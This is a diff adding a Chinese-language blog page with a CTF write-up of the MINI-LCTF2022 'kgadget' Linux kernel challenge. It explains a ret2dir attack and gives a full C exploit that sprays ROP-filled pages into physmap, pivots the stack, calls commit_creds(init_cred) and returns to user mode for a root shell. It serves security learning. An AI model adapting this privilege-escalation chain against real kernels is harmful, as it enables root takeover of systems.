@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="ret2dir大佬的博客说得很详细了【PWN.0x00】Linux Kernel Pwn I：Basic Exploit to Kernel Pwn in CTF - arttnba3’s blog 这里只简单说下我的理解，可能会有理解错误的地方：在x86下的Linux内核中存在一块叫direct mapping area（线性映射区）的区域，这块区域在内核中直接线性地映射了整片物理内存空间，这就">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MINI-LCTF2022-kgadget(ret2dir)">
+<meta property="og:url" content="https://github.com/CharonPt/CharonPt.github.io.git/2022/10/23/MINI-LCTF2022-kgadget/index.html">
+<meta property="og:site_name" content="CharonPt的Blog">
+<meta property="og:description" content="ret2dir大佬的博客说得很详细了【PWN.0x00】Linux Kernel Pwn I：Basic Exploit to Kernel Pwn in CTF - arttnba3’s blog 这里只简单说下我的理解，可能会有理解错误的地方：在x86下的Linux内核中存在一块叫direct mapping area（线性映射区）的区域，这块区域在内核中直接线性地映射了整片物理内存空间，这就">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://github.com/2022/10/23/MINI-LCTF2022-kgadget/kgadget-1.jpg">
+<meta property="og:image" content="https://github.com/2022/10/23/MINI-LCTF2022-kgadget/kgadget-2.jpg">
+<meta property="og:image" content="https://github.com/2022/10/23/MINI-LCTF2022-kgadget/kgadget-3.png">
+<meta property="og:image" content="https://github.com/2022/10/23/MINI-LCTF2022-kgadget/kgadget-4.png">
+<meta property="og:image" content="https://github.com/2022/10/23/MINI-LCTF2022-kgadget/kgadget-5.png">
+<meta property="og:image" content="https://github.com/2022/10/23/MINI-LCTF2022-kgadget/sw_rt-1.jpg">
+<meta property="og:image" content="https://github.com/2022/10/23/MINI-LCTF2022-kgadget/sw_rt-2.jpg">
+<meta property="og:image" content="https://github.com/2022/10/23/MINI-LCTF2022-kgadget/sw_rt-3.jpg">
+<meta property="article:published_time" content="2022-10-23T13:24:34.000Z">
+<meta property="article:modified_time" content="2022-10-24T03:17:27.240Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="kernel">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/2022/10/23/MINI-LCTF2022-kgadget/kgadget-1.jpg">
+
+<link rel="canonical" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/10/23/MINI-LCTF2022-kgadget/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>MINI-LCTF2022-kgadget(ret2dir) | CharonPt的Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">CharonPt的Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/10/23/MINI-LCTF2022-kgadget/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          MINI-LCTF2022-kgadget(ret2dir)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-10-23 21:24:34" itemprop="dateCreated datePublished" datetime="2022-10-23T21:24:34+08:00">2022-10-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-10-24 11:17:27" itemprop="dateModified" datetime="2022-10-24T11:17:27+08:00">2022-10-24</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="ret2dir"><a href="#ret2dir" class="headerlink" title="ret2dir"></a>ret2dir</h3><p>大佬的博客说得很详细了<a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x03-Kernel-ROP-ret2dir">【PWN.0x00】Linux Kernel Pwn I：Basic Exploit to Kernel Pwn in CTF - arttnba3’s blog</a></p>
+<p>这里只简单说下我的理解，可能会有理解错误的地方：在x86下的Linux内核中存在一块叫<code>direct mapping area</code>（线性映射区）的区域，这块区域在内核中直接线性地映射了<strong>整片物理内存空间</strong>，这就意味着任意一块用户内存都能用内核</p>
+<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>首先是<code>init</code>文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">chown -R 0:0 /</span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line"></span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"></span><br><span class="line">chown 0:0 /flag</span><br><span class="line">chmod 400 /flag</span><br><span class="line">chmod 777 /tmp</span><br><span class="line"></span><br><span class="line">insmod kgadget.ko</span><br><span class="line">chmod 777 /dev/kgadget</span><br><span class="line"></span><br><span class="line">cat /root/banner</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line">poweroff -d 0 -f</span><br></pre></td></tr></table></figure>
+
+<p>然后是启动脚本</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">        -m 256M \</span><br><span class="line">        -cpu kvm64,+smep,+smap \</span><br><span class="line">        -smp cores=2,threads=2 \</span><br><span class="line">        -kernel bzImage \</span><br><span class="line">        -initrd ./root.cpio \</span><br><span class="line">        -nographic \</span><br><span class="line">        -monitor /dev/null \</span><br><span class="line">        -snapshot \</span><br><span class="line">        -append &quot;console=ttyS0 nokaslr pti=on quiet oops=panic panic=1&quot; \</span><br><span class="line">        -s</span><br></pre></td></tr></table></figure>
+
+<p>可以看到没开<code>kaslr</code>，开了<code>smep、smap</code></p>
+<p>驱动中除了初始化的函数以外有用的只有ioctl函数</p>
+<img src="/2022/10/23/MINI-LCTF2022-kgadget/kgadget-1.jpg" class>
+
+<img src="/2022/10/23/MINI-LCTF2022-kgadget/kgadget-2.jpg" class>
+
+<p>从<code>init</code>文件可知不能用<code>dmesg</code>，所以第一个printk()其实没有意义</p>
+<p>ioctl中有用的部分可以分成两块，红框那些部分相当于<code>call rdx</code></p>
+<p>橙框那部分经过调试可知是先把rax抬到栈底，然后基于rax把在栈底的<code>pt_regs</code>结构体中的部分寄存器修改成了垃圾数据，到最后执行到<code>call rdx</code>时可以发现除去用来系统调用的寄存器外，还能被我们控制的寄存器只剩下<code>r9、r8</code></p>
+<h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>传入的rdx是猜测的一个内存页的地址，里面保存了写入的ROP链。如果call命中内存页的话那么大概率会是<code>add rsp;ret</code>指令，但是要注意的是虽然rip指向了我们写ROP的位置，但是rsp还是在内核栈上，所以要把rsp迁移到ROP的位置，此时要做到这点就只能通过<code>pop rsp;ret</code>这种指令，要成功完成这点就需要布置<code>pop rsp;ret</code>跟要pop的值，且能够执行<code>pop rsp;ret</code></p>
+<img src="/2022/10/23/MINI-LCTF2022-kgadget/kgadget-3.png" class>
+
+<p>从这张图可以算出在程序流程走到执行我们布置的ROP时rsp跟pt_regs中r9的位置相差0xc0，也就是说如果能找到一条等价于<code>add rsp,0xc0;ret</code>的指令，就能完成将栈迁移到我们布置ROP的内存页上了</p>
+<p>实际搜索时发现没有直接<code>add rsp,0xc0;ret</code>这条指令</p>
+<img src="/2022/10/23/MINI-LCTF2022-kgadget/kgadget-4.png" class>
+
+<p>但是没关系，继续往下找0xb8、0xb0、0xa8……</p>
+<img src="/2022/10/23/MINI-LCTF2022-kgadget/kgadget-5.png" class>
+
+<p>然后在搜到0xa8时找到了一条等价的，那么就可以选择用这条gadget</p>
+<h4 id="关于swapgs-restore-regs-and-return-to-usermode函数"><a href="#关于swapgs-restore-regs-and-return-to-usermode函数" class="headerlink" title="关于swapgs_restore_regs_and_return_to_usermode函数"></a>关于swapgs_restore_regs_and_return_to_usermode函数</h4><p>该函数的功能是将内核栈上的<code>pt_regs</code>结构体中的值pop回寄存器，然后返回到用户态。也就是说其里面就有swapgs和iretq的流程，目前学到的它的利用就是用它来代替拆散的<code>swapgs</code>和<code>iretq</code></p>
+<p>从该函数的开始位置看起，关注下面的部分重点</p>
+<img src="/2022/10/23/MINI-LCTF2022-kgadget/sw_rt-1.jpg" class>
+
+<img src="/2022/10/23/MINI-LCTF2022-kgadget/sw_rt-2.jpg" class>
+
+<img src="/2022/10/23/MINI-LCTF2022-kgadget/sw_rt-3.jpg" class>
+
+<p>在函数进行一系列的pop指令之后会用rdi来保存当前rsp的值，然后将rsp切到另外一个地址，接着基于rdi来把原本地址上的部分值push到当前栈上。</p>
+<p>那么很简单，如果要利用<code>swapgs_restore_regs_and_return_to_usermode</code>函数来进行<code>swapgs;iretq</code>的操作的话就可以选择跳到其地址+0x1B偏移处（也就是对应<code>mov rdi,rsp;</code>这条指令开始），然后布置两个padding，后面再接iretq的内容（从上面push和pop的关系可以知道，<code>[rdi]</code>会被pop掉，<code>[rdi + 8]</code>不会被push，从<code>[rdi + 10]</code>开始属于被<code>iretq</code>pop的内容）</p>
+<p>也就是如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rop[i++] = swapgs_restore_regs_and_return_to_usermode+<span class="number">0x1B</span>;</span><br><span class="line">rop[i++] = <span class="number">0xDEADBEEF</span>;</span><br><span class="line">rop[i++] = <span class="number">0xDEAFBEEF</span>;</span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)getshell;</span><br><span class="line">rop[i++] = user_cs;</span><br><span class="line">rop[i++] = user_rflags;</span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br></pre></td></tr></table></figure>
+
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0xffffffff810c92e0</span>;</span><br><span class="line"><span class="keyword">size_t</span> init_cred = <span class="number">0xffffffff82a6b700</span>;</span><br><span class="line"><span class="keyword">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00fb0</span>+<span class="number">0x1B</span>;</span><br><span class="line"><span class="keyword">size_t</span> pop_rdi = <span class="number">0xffffffff8108c6f0</span>;</span><br><span class="line"><span class="keyword">size_t</span> pop_rsp = <span class="number">0xffffffff811483d0</span>;</span><br><span class="line"><span class="keyword">size_t</span> add_rsp_0xa8_pop3 = <span class="number">0xffffffff81488561</span>;</span><br><span class="line"><span class="keyword">size_t</span> ret = <span class="number">0xffffffff8108c6f1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> page_size;</span><br><span class="line"><span class="keyword">size_t</span> fd;</span><br><span class="line"><span class="keyword">size_t</span> *map_spray[<span class="number">16000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">size_t</span> try_hit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_rflags,user_sp,user_ss;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm__(<span class="string">&quot;mov user_cs,cs;&quot;</span></span><br><span class="line">			<span class="string">&quot;mov user_sp,rsp;&quot;</span></span><br><span class="line">			<span class="string">&quot;mov user_ss,ss;&quot;</span></span><br><span class="line">			<span class="string">&quot;pushf;&quot;</span></span><br><span class="line">			<span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">			);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*]Status has been saved!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">()</span>	</span>&#123; system(<span class="string">&quot;/bin/sh&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">constructROPchain</span><span class="params">(<span class="keyword">size_t</span> *rop)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(;i &lt; (page_size/<span class="number">8</span><span class="number">-0x30</span>);i++)</span><br><span class="line">		rop[i] = add_rsp_0xa8_pop3;</span><br><span class="line">	<span class="keyword">for</span>(;i &lt; (page_size/<span class="number">8</span><span class="number">-12</span>);i++)</span><br><span class="line">		rop[i] = ret;</span><br><span class="line">	rop[i++] = pop_rdi;</span><br><span class="line">	rop[i++] = init_cred;</span><br><span class="line">	rop[i++] = commit_creds;</span><br><span class="line">	rop[i++] = swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">	rop[i++] = <span class="number">0xDEAFBEEF</span>;</span><br><span class="line">	rop[i++] = <span class="number">0xDEADBEEF</span>;</span><br><span class="line">	rop[i++] = (<span class="keyword">size_t</span>)getshell;</span><br><span class="line">	rop[i++] = user_cs;</span><br><span class="line">	rop[i++] = user_rflags;</span><br><span class="line">	rop[i++] = user_sp;</span><br><span class="line">	rop[i++] = user_ss;</span><br><span class="line">	rop[i++] = <span class="number">0xDEADBEEF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	save_status();</span><br><span class="line">	fd = open(<span class="string">&quot;/dev/kgadget&quot;</span>,O_RDWR);</span><br><span class="line">	<span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;open ERR!\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	page_size = sysconf(_SC_PAGESIZE);</span><br><span class="line">	map_spray[<span class="number">0</span>] = mmap(<span class="literal">NULL</span>,page_size,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">	constructROPchain(map_spray[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*]spraying map&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; <span class="number">15000</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		map_spray[i] = mmap(<span class="literal">NULL</span>,page_size,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span>(!map_spray[i])</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d mmap ERR!&quot;</span>,i);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">memcpy</span>(map_spray[i],map_spray[<span class="number">0</span>],page_size);</span><br><span class="line">	&#125;</span><br><span class="line">	try_hit = <span class="number">0xffff888000000000</span> + <span class="number">0x7000000</span>;</span><br><span class="line">	__asm__(<span class="string">&quot;mov r9,pop_rsp;&quot;</span></span><br><span class="line">			<span class="string">&quot;mov r8,try_hit;&quot;</span></span><br><span class="line">			<span class="string">&quot;mov rdi,fd;&quot;</span></span><br><span class="line">			<span class="string">&quot;mov rsi,0x1BF52;&quot;</span></span><br><span class="line">			<span class="string">&quot;mov rdx,try_hit;&quot;</span></span><br><span class="line">			<span class="string">&quot;mov rax,16;&quot;</span></span><br><span class="line">			<span class="string">&quot;syscall;&quot;</span></span><br><span class="line">			);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/kernel/" rel="tag"># kernel</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/10/20/CISCN2017-babydriver/" rel="prev" title="CISCN2017-babydriver(UAF)">
+      <i class="fa fa-chevron-left"></i> CISCN2017-babydriver(UAF)
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/11/07/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%88%9D%E8%B5%9B/" rel="next" title="2022强网拟态初赛">
+      2022强网拟态初赛 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2dir"><span class="nav-number">1.</span> <span class="nav-text">ret2dir</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE"><span class="nav-number">2.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%81%E7%A8%8B"><span class="nav-number">3.</span> <span class="nav-text">流程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B3%E4%BA%8Eswapgs-restore-regs-and-return-to-usermode%E5%87%BD%E6%95%B0"><span class="nav-number">3.1.</span> <span class="nav-text">关于swapgs_restore_regs_and_return_to_usermode函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">4.</span> <span class="nav-text">exp</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">70</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">43</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
